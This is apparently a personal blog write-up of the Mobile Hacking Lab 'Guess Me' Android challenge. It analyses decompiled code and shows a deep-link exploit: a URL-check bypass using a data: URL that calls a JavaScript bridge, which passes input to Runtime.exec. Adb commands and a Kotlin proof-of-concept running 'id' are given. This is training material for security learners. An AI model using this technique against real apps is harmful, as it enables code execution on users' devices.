---
date: '2025-04-01T18:19:43+08:00'
title: 'MHL Guess Me'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> Welcome to the "Guess Me" Deep Link Exploitation Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge revolves around a fictitious "Guess Me" app, shedding light on a critical security flaw related to deep links that can lead to remote code execution within the app's framework.
>
> [guessme.apk](static/guessme.apk)

## Solution

I started out by performing static analysis.

### Static Analysis

As usual, `jadx-gui` for reading the code. 

```xml
<activity
    android:name="com.mobilehackinglab.guessme.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="com.mobilehackinglab.guessme.WebviewActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="mhl"
            android:host="mobilehackinglab"/>
    </intent-filter>
</activity>
```

According to the `AndroidManifest.xml`, there's an activity `WebviewActivity` where it has `android:scheme` and `android:host`. This is related to web URL and deep link where it should look something like `mhl://mobilehackinglab`. 

```java
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_web);
    View findViewById = findViewById(R.id.webView);
    Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
    this.webView = (WebView) findViewById;
    WebView webView = this.webView;
    WebView webView2 = null;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    WebSettings webSettings = webView.getSettings();
    Intrinsics.checkNotNullExpressionValue(webSettings, "getSettings(...)");
    webSettings.setJavaScriptEnabled(true);
    WebView webView3 = this.webView;
    if (webView3 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView3 = null;
    }
    webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
    WebView webView4 = this.webView;
    if (webView4 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView4 = null;
    }
    webView4.setWebViewClient(new WebViewClient());
    WebView webView5 = this.webView;
    if (webView5 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
    } else {
        webView2 = webView5;
    }
    webView2.setWebChromeClient(new WebChromeClient());
    loadAssetIndex();
    handleDeepLink(getIntent());
}
```

Moving on to the `onCreate` function in `WebviewActivity` activity, one thing important here is that the JavaScript is enabled. Aside from that, it will run `loadAssetIndex()` and `handleDeepLink()` function.

```java
private final void loadAssetIndex() {
    WebView webView = this.webView;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl("file:///android_asset/index.html");
}
```

The `loadAssetIndex()` function basically just load the webView from the `index.html`

```java
private final void handleDeepLink(Intent intent) {
    Uri uri = intent != null ? intent.getData() : null;
    if (uri != null) {
        if (isValidDeepLink(uri)) {
            loadDeepLink(uri);
        } else {
            loadAssetIndex();
        }
    }
}
```

As for the `handleDeepLink()` function, it will first check if there is an intent and the intent consist of any data. If there is data, it will go through `isValidDeepLink()` function and run `loadDeepLink()` function if the result is true.

```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
}
```

This `isValidDeepLink()` function basically check if the uri scheme is either `mhl` or `https` and the host is `mobilehackinglab` or not. If its correct, it will proceed on getting the query parameter `uri` via `uri.getQueryParameter("url")` and check if its end with `mobilehackinglab.com`. As for my current understanding, the deep link URL should look something like this, `mhl://mobilehackinglab/?uri=mobilehackinglab.com`.

```java
private final void loadDeepLink(Uri uri) {
    String fullUrl = String.valueOf(uri.getQueryParameter("url"));
    WebView webView = this.webView;
    WebView webView2 = null;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl(fullUrl);
    WebView webView3 = this.webView;
    if (webView3 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
    } else {
        webView2 = webView3;
    }
    webView2.reload();
}
```

As for the `loadDeepLink()` function, it basically just get the URL from `url` query parameter and load into the webview. 

```java
public final class MyJavaScriptInterface {
    public MyJavaScriptInterface() {
    }

    @JavascriptInterface
    public final void loadWebsite(String url) {
        Intrinsics.checkNotNullParameter(url, "url");
        WebView webView = WebviewActivity.this.webView;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl(url);
    }

    @JavascriptInterface
    public final String getTime(String Time) {
        Intrinsics.checkNotNullParameter(Time, "Time");
        try {
            Process process = Runtime.getRuntime().exec(Time);
            InputStream inputStream = process.getInputStream();
            Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
            Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
            BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
            String readText = TextStreamsKt.readText(reader);
            reader.close();
            return readText;
        } catch (Exception e) {
            return "Error getting time";
        }
    }
}
```

This part of the Java code is to set up JavaScript where `loadWebsite` basically load the website from provided URL and `getTime` function basically getting time by running `getRuntime().exec(Time)`. This part of the code looks vulnerable as it is executing command and the command is getting as the function input. Based on the existing information, I could perform RCE if I could run the JavaScript `getTime` in the webview. 

### Dynamic Analysis

I started out by interacting with the application to test out if the deep link URL that I understand is correct or not. 

```bash
adb shell am start -a android.intent.action.VIEW -d 'mhl://mobilehackinglab'
Starting: Intent { act=android.intent.action.VIEW dat=mhl://mobilehackinglab/... }
```

![alt text](img/index.png#center)

By using the `adb` command to run, it is possible to interact with the application.

```bash
adb shell am start -a android.intent.action.VIEW -d 'mhl://mobilehackinglab/?url=mobilehackinglab.com'
Starting: Intent { act=android.intent.action.VIEW dat=mhl://mobilehackinglab/... }
```

![alt text](img/index-1.png#center)

By providing the deep link `mhl://mobilehackinglab/?url=mobilehackinglab.com`, the application will open the website of `mobilehackinglab.com` instead of the default `index.html`. Now I just need to think of a method to inject my own URL into it.

```bash
adb shell am start -a android.intent.action.VIEW -d 'mhl://mobilehackinglab/?url=https://callmeks.github.io/?test=mobilehackinglab.com'
Starting: Intent { act=android.intent.action.VIEW dat=mhl://mobilehackinglab/... }
```

![alt text](img/index-2.png#center)

I managed to load other other website by using the `?test` which ignore the input behind while still having `mobilehackinglab.com`. By using this idea, I created an POC application to perform the RCE. 

```kotlin
@Composable
fun test() {
    val intent = Intent().apply {
        setClassName(
            "com.mobilehackinglab.guessme",
            "com.mobilehackinglab.guessme.WebviewActivity"
        )
        setData(Uri.parse("mhl://mobilehackinglab/?url=data:text/html,<script>document.write(AndroidBridge.getTime('id'))</script> mobilehackinglab.com"))
    }
    LocalContext.current.startActivity(intent)
}
```

![alt text](img/index-3.png#center)

By using `data:text/html`, it will treat the code behind it as html instead of URL. By abusing this technique, it is possible to execute the JavaScript `getTime('id')` and perform RCE while remaining the `mobilehackinglab.com` at the end of the URL to meet the criteria.

## Things I learned from this challenge

- deep link to execute JavaScript function
- misconfiguration lead to RCE